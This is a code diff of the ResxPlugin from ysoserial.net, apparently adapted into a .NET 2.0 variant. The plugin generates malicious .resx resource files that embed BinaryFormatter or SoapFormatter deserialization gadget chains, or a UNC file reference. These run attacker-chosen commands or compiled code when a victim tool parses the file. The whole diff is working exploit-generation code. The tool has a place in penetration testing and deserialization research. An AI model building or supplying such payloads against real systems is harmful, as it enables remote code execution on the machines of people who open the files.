@@ -1,7 +1,7 @@
 ﻿using System.Collections.Generic;
 using NDesk.Options;
 using System;
-using ysoserial.Generators;
+using ysoserial_frmv2.Generators;
 
 /**
  * Author: Soroush Dalili (@irsdl) from NCC Group (@NCCGroupInfosec)
@@ -16,7 +16,7 @@ using ysoserial.Generators;
  *  https://www.nccgroup.trust/uk/our-research/technical-advisory-code-execution-by-viewing-resource-files-in-net-reflector/
  **/
 
-namespace ysoserial.Plugins
+namespace ysoserial_frmv2.Plugins
 {
     class ResxPlugin : Plugin
     {
@@ -27,7 +27,7 @@ namespace ysoserial.Plugins
         static OptionSet options = new OptionSet()
             {
                 {"M|mode=", "the payload mode: indirect_resx_file, BinaryFormatter, SoapFormatter.", v => mode = v },
-                {"c|command=", "the command to be executed in BinaryFormatter. If this is provided for SoapFormatter, it will be used as a file for ActivitySurrogateSelectorFromFile", v => command = v },
+                {"c|command=", "the command to be executed using ActivitySurrogateSelectorFromFileGenerator e.g. \"ExploitClass.cs; System.Windows.Forms.dll\"", v => command = v },
                 {"F|file=", "UNC file path location: this is used in indirect_resx_file mode.", v => file = v },
             };
 
@@ -117,12 +117,12 @@ namespace ysoserial.Plugins
  <value>2.0</value>
  </resheader>
  <resheader name=""reader"">
- <value>System.Resources.ResXResourceReader, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+ <value>System.Resources.ResXResourceReader, System.Windows.Forms, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
  </resheader>
  <resheader name=""writer"">
- <value>System.Resources.ResXResourceWriter, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+ <value>System.Resources.ResXResourceWriter, System.Windows.Forms, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
  </resheader>
- <assembly alias=""System.Windows.Forms"" name=""System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"" />
+ <assembly alias=""System.Windows.Forms"" name=""System.Windows.Forms, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"" />
 
 <data name=""test"" {0}>
  <value>{1}</value>
@@ -131,31 +131,31 @@ namespace ysoserial.Plugins
             switch (mode.ToLower())
             {
                 case "indirect_resx_file":
-                    if (!String.IsNullOrEmpty(file) && !String.IsNullOrWhiteSpace(file))
+                    if (!String.IsNullOrEmpty(file) && !String.IsNullOrEmpty(file.Trim()))
                     {
                         mtype = @"type=""System.Resources.ResXFileRef""";
-                        payloadValue = file + "; System.Resources.ResXResourceSet, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089";
+                        payloadValue = file + "; System.Resources.ResXResourceSet, System.Windows.Forms, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089";
                     }
                     break;
                 case "binaryformatter":
-                    if (!String.IsNullOrEmpty(command) && !String.IsNullOrWhiteSpace(command))
+                    if (!String.IsNullOrEmpty(command) && !String.IsNullOrEmpty(command.Trim()))
                     {
                         mtype = @"mimetype=""application/x-microsoft.net.object.binary.base64""";
-                        byte[] osf = (byte[])new TypeConfuseDelegateGenerator().Generate(command, "BinaryFormatter", false);
+                        byte[] osf = (byte[])new ActivitySurrogateSelectorFromFileGenerator().Generate(command, "BinaryFormatter", false);
                         payloadValue = Convert.ToBase64String(osf);
 
                     }
                     break;
                 case "soapformatter":
                     mtype = @"mimetype=""application/x-microsoft.net.object.soap.base64""";
-                    if (!String.IsNullOrEmpty(command) && !String.IsNullOrWhiteSpace(command))
+                    if (!String.IsNullOrEmpty(command) && !String.IsNullOrEmpty(command.Trim()))
                     {
                         byte[] osf = (byte[])new ActivitySurrogateSelectorFromFileGenerator().Generate(command, "SoapFormatter", false);
                         payloadValue = Convert.ToBase64String(osf);
                     }
                     else
                     {
-                        byte[] osf = (byte[])new ActivitySurrogateSelectorGenerator().Generate("", "SoapFormatter", false);
+                        byte[] osf = (byte[])new ActivitySurrogateSelectorFromFileGenerator().Generate("", "SoapFormatter", false);
                         payloadValue = Convert.ToBase64String(osf);
                     }
                     break;
